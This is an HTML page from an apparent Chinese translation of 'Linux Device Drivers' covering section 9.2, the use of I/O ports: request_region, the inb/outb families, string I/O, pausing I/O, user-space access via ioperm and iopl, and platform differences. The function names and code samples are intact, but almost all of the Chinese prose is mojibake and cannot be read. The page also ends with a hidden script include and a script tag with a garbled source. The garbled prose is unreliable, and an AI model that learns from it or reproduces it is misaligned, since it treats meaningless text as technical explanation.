<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>9.2.&#160;ʹ I/O ˿-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch09.html" title="&#160;9&#160;&#160;ӲͨѶ">
<link rel="prev" href="ch09.html" title="&#160;9&#160;&#160;ӲͨѶ">
<link rel="next" href="ch09s03.html" title="9.3.&#160;һ I/O ˿">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">9.2.&#160;ʹ I/O ˿</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch09.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;9&#160;&#160;ӲͨѶ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch09s03.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="UsingIOPort.sect"></a>9.2.&#160;ʹ I/O ˿</h2></div></div></div>
<p>I/O ˿ͺܶ豸ͨѶķ, ٲʱ. 漰õĸֺʹ I/O ˿; ҲһЩֲ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="IOPortAllocation.sect"></a>9.2.1.&#160;I/O ˿ڷ</h3></div></div></div>
<p>ͬϣ, 㲻Ӧ뿪ʼ I/O ˿ڶûȷЩ˿ΨһȨ. ںṩһעӿҪĶ˿. ӿеĺĵĺ request_region:</p>
<pre class="programlisting">
#include &lt;linux/ioport.h&gt;
struct resource *request_region(unsigned long first, unsigned long n, const char *name);
</pre>
<p>ں, Ҫʹ n ˿,  first ʼ. name Ӧ豸. ɹֵǷ NULL.  request_region õ NULL, 㽫޷ʹҪĶ˿. </p>
<p>еĵĶ˿ڷʾ /proc/ioports . 㲻ܷһҪĶ˿, ǵط˭ȵ.</p>
<p>һ I/O ˿(ģжʱ, Ҳ), ӦǸϵͳ, ʹ:</p>
<pre class="programlisting">
void release_region(unsigned long start, unsigned long n); 
</pre>
<p>һǷһ I/O ˿:</p>
<pre class="programlisting">
int check_region(unsigned long first, unsigned long n); 
</pre>
<p>, Ķ˿ڲ, ֵһ. ǲƼ, Ϊķֵ֤Ƿһɹ; ͺķ䲻һԭӵĲ. ΪȻʹ, һֱʹ request_region, Ҫļ֤һȫԭӵķʽ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ManipulatingIOports.sect"></a>9.2.2.&#160; I/O ˿</h3></div></div></div>
<p>ӲĻҪʹõ I/O ˿ڷΧ֮, /дЩ˿. Ϊ, 󲿷Ӳ8-λ, 16-λ,  32-λ˿. ޷, ʹϵͳڴȡһ.<sup>[<a name="id455968" href="#ftn.id455968">33</a>]</sup></p>
<p>һ C , , òͬĺȡͬСĶ˿. ǰһн, ֻ֧Ψһڴӳ I/O Ĵļϵαװ˿ I/O , ͨӳ˿ڵַڴַ, ںϸԱֲ. Linux ںͷļ(ر, ϵͷļ &lt;asm/io.h&gt;) ȡ I/O ˿:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>unsigned inb(unsigned port);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void outb(unsigned char byte, unsigned port);</span></span></dt>
<dd><p>дֽڶ˿( 8 λ ). port Ϊ unsigned long ĳЩƽ̨Լ unsigned short . inb ķҲǿϵͬ.</p></dd>
<dt><span class="term"><span>unsigned inw(unsigned port);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void outw(unsigned short word, unsigned port);</span></span></dt>
<dd><p>Щȡ 16-λ ˿( һֿ ); Ϊ S390 ƽ̨ʱǲ, ֻֽ֧ I/O.</p></dd>
<dt><span class="term"><span>unsigned inl(unsigned port);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void outl(unsigned longword, unsigned port);</span></span></dt>
<dd><p>Щȡ 32-λ ˿. longword Ϊ unsigned long  unsigned int, ƽ̨. ͬ I/O, "Long" I/O  S390 ϲ.</p></dd>
</dl></div>
<p>ڿʼ, ʹ unsigned ûнһ͹涨ʱ, ָһϵصĶ, ȷǲص. һֱǿֲ, ΪԶתֵڸֵʱ --  unsigned ֹʱľ. תʧϢ, ֻҪԱǵֵ. Ǽ"δɵ"ͳᴮ.</p>
<p>ע, ûж 64-λ ˿ I/O .  64-λ ϵ, ˿ڵַռʹһ32-λ()ͨ·.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="IOPortAccessfromUserSpace.sect"></a>9.2.3.&#160;ûռ I/O ȡ</h3></div></div></div>
<p>ոЩҪ㱻豸ʹ, Ҳɴûռʹ,  PC- ļ. GNU C  &lt;sys/io.h&gt; ж. ӦӦ inb ûռʹ:</p>
<div class="itemizedlist"><ul type="disc">
<li><p>ʹ -O ѡǿչ.</p></li>
<li><p>ioperm  iopl ϵͳñȨжԶ˿ڵ I/O . ioperm Ϊ˿ڻȡ,  iopl Ϊ I/O ռȡ.  2  x86 е.</p></li>
<li><p>Ϊ root  ioperm  iopl.<sup>[<a name="id456132" href="#ftn.id456132">34</a>]</sup> ѡ, һȱӮΪ root еĶ˿Ȩ.</p></li>
</ul></div>
<p>ƽ̨û ioperm  iopl ϵͳ, ûռȻԴȡ I/O ˿, ͨʹ /dev/prot 豸ļ. ע, , ļĺǷǳƽ̨ض, Ҷκζ PC .</p>
<p>Դ misc-progs/inp.c  misc-progs/outp.c һжд˿ڵС, ûռ. ϣװڶ(, inb, inw,  inl Ҳֽ, , ߳˿ûĸ). ʹ ioperm  iopl  x86, ƽ̨ /dev/port.</p>
<p> setuid root, ΣڲҪȷȨ޵ʹӲ. , 벻ҪڲƷϵͳ set-uid װ; ϵİȫ©.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="StringOperations.sect"></a>9.2.4.&#160;ִ</h3></div></div></div>
<p>˵, һЩʵָһϵֽ, ,   һ I/O ˿ڻͬС. νִָ, һ C ѭĸ. к궨ʵִĸͨʹһִָͨһյѭ, Ŀ괦ûнִ I/O ָ. Ϊ S390 ƽ̨ʱЩ궨. ӦǸֲ, Ϊƽ̨ͨƽ̨豸, Ϊǲͬ.</p>
<p>ִԭ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>void insb(unsigned port, void *addr, unsigned long count);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void outsb(unsigned port, void *addr, unsigned long count);</span></span></dt>
<dd><p>дڴַ addr ʼ count ֽ. ݶԻд뵥 port ˿.</p></dd>
<dt><span class="term"><span>void insw(unsigned port, void *addr, unsigned long count);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void outsw(unsigned port, void *addr, unsigned long count);</span></span></dt>
<dd><p>д 16-λ ֵһ 16-λ ˿.</p></dd>
<dt><span class="term"><span>void insl(unsigned port, void *addr, unsigned long count);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void outsl(unsigned port, void *addr, unsigned long count);</span></span></dt>
<dd><p>д 32-λ ֵһ 32-λ ˿.</p></dd>
</dl></div>
<p>мҪס, ʹִʱ: ƶһֽԶ˿. ˿ںϵͳвֽͬڶ, ˾ȵ. ʹ inw ȡһ˿ڽЩֽ, Ҫ, ʹȡֵƥֽ. ִ, ෴, .</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="PausingIO.sect"></a>9.2.5.&#160;ͣ I/O</h3></div></div></div>
<p>һЩƽ̨ -  i386 - ⵱ͼ̫촫ݵ. ߱ʱ( һ ISA )ҿܵ豸̫ʱֳ. ǲһСʱÿ I/O ָ, һָ.  x86 , ͣͨһ outb ָ˿ 0x80 ( زǳõ )ʵֵ, ͨæȴ. ϸڼƽ̨ asm Ŀ¼ io.h ļ.</p>
<p>豸ʧһЩ, 㵣ܶʧһЩ, ʹͣЩ. ͣǰг, ǵ _p β; ǳΪ inb_p, outb_p, ȵ. Щ󲿷ֱֵ֧ϵ, ǳչΪͣ I/O ͬĴ, ΪûбҪͣ, ϵʹһִ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="PlatformDependencies.sect"></a>9.2.6.&#160;ƽ̨</h3></div></div></div>
<p>I/O ָ, ǵ, Ǹ߶ȴ. ΪʹôδƽƳϸ, ǷǳϵͳĲͬ. Ϊһ, 󲿷ֵĹڶ˿ I/O Դƽ̨.</p>
<p>Կһ, , ͨؿб, ǲͬ, ƽ̨ϵͬ. , һ˿ unsigned int  x86 (ﴦ֧һ 64-KB I/O ռ), ڱƽ̨ unsiged long, Ķ˿ֻͬڴһͬһַռеλ.</p>
<p>ƽ̨ԴеĻĽṹԲͬ, , , ޿ɱ. ǲԵϸ, ΪǼٶ㲻һϵͳд豸ûײӲ. ෴, һںֵ֧ϵĸ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>IA-32 (x86)</span></span></dt>
<dd></dd>
<dt><span class="term"><span>x86_64 </span></span></dt>
<dd><p>ϵ֧еıĺ. ˿ں unsigned short .</p></dd>
<dt><span class="term"><span>IA-64 (Itanium)</span></span></dt>
<dd><p>֧к; ˿ unsigned long(Լڴӳ)). ִ C ʵ.</p></dd>
<dt><span class="term"><span>Alpha </span></span></dt>
<dd><p>֧к, Ҷ˿ڴӳ. ˿ I/O ʵڲͬ Alpha ƽ̨ǲͬ, ʹõоƬ. ִ C ʵֲҶ arch/alpha/lib/io.c ж. ˿ unsigned long.</p></dd>
<dt><span class="term"><span>ARM </span></span></dt>
<dd><p>˿ڴӳ, ֧к; ִ C ʵ. ˿ unsigned int .</p></dd>
<dt><span class="term"><span>Cris </span></span></dt>
<dd><p>ϵ֧ I/O ˿ڳ, һģģʽ; ֶ˿ڲʲô.</p></dd>
<dt><span class="term"><span>M68k</span></span></dt>
<dd></dd>
<dt><span class="term"><span>M68k</span></span></dt>
<dd><p>˿ڴӳ. ִ֧, Ҷ˿ unsigned char.</p></dd>
<dt><span class="term"><span>MIPS</span></span></dt>
<dd></dd>
<dt><span class="term"><span>MIPS64 </span></span></dt>
<dd><p>MIPS ˿֧еĺ. ִʹýջѭʵ, Ϊȱִ I/O. ˿ڴӳ;  unsigned long.</p></dd>
<dt><span class="term"><span>PA</span></span></dt>
<dd><p>֧к; ˿ int ڻ PCI ϵͳԼ unsigned short  EISA ϵͳ, ִ, ʹ unsigned long ˿ں.</p></dd>
<dt><span class="term"><span>PowerPC</span></span></dt>
<dd></dd>
<dt><span class="term"><span>PowerPC64 </span></span></dt>
<dd><p>֧к; ˿ unsigned char *  32-λ ϵͳϲ unsigned long  64-λ ϵͳ.</p></dd>
<dt><span class="term"><span>S390 </span></span></dt>
<dd> M68k, ƽ̨ͷļֻֽ֧ڿĶ˿ I/O, ûִ. ˿ char ָ벢ڴӳ.<p></p>
</dd>
<dt><span class="term"><span>Super</span></span></dt>
<dd><p>˿ unsigned int ( ڴӳ ), ֧к.</p></dd>
<dt><span class="term"><span>SPARC SPARC64 </span></span></dt>
<dd><p>һ, I/O ռڴӳ. ˿ںİ汾ʹ unsigned long ˿.</p></dd>
</dl></div>
<p>Ķܹ io.h ļлøϢ, ļʱ弸ṹضĺ, ڱЩ. , ЩЩļ൱Ѷ.</p>
<p>Ȥעû x86 ֮Ĵ߱һͬĵַռ˿, ֵܼ֧ļ䱸 ISA / PCI  (  2 ʵַֿ I/O ͵ַռ ).</p>
<p>, Щ(ڵ Alphas)ȱһƶһ 2 ֽڵָ.<sup>[<a name="id456626" href="#ftn.id456626">35</a>]</sup> , ǵоƬģ 8-λ  16-λ I/O ȡ, ͨӳǵڴַռĵַΧ. , ͬһ˿ڵһ inb  һ inw ָ, ͨ 2 ַͬ 32-λڴʵ. ˵, Щ豸д, ͨĺڲ, ǾһҪעȤ. ̽,  include/asm-alpha/core_lca.h е.</p>
<p>ÿƽ̨ĳԱֲгI/O ÿƽ̨Ͻ; Щ᳣ֲ WEB Ϊ PDF .</p>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id455968" href="#id455968">33</a>] </sup>ʱ I/O ˿ڴһ, () 2  8-λ дΪһ 16-λ . , Ӧ PC Ƶ. ͨ, 㲻ָɫ.</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id456132" href="#id456132">34</a>] </sup>,  CAP_SYS_RAWIO , ڴ󲿷ֵǰϵͳΪ root ͬ.</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id456626" href="#id456626">35</a>] </sup>ֽ I/O һ˿ôҪ, ΪһϡٵĲ. Ϊ/дһֽڵκεַռ, Ҫʵһͨ, ӼĴߵĵλⲿߵֽλ. ЩͨҪ߼ÿݴͨ. ֽڿʹ洢ܹʹϵͳ.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch09.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch09.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch09s03.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">&#160;9&#160;&#160;ӲͨѶ&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;9.3.&#160;һ I/O ˿</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>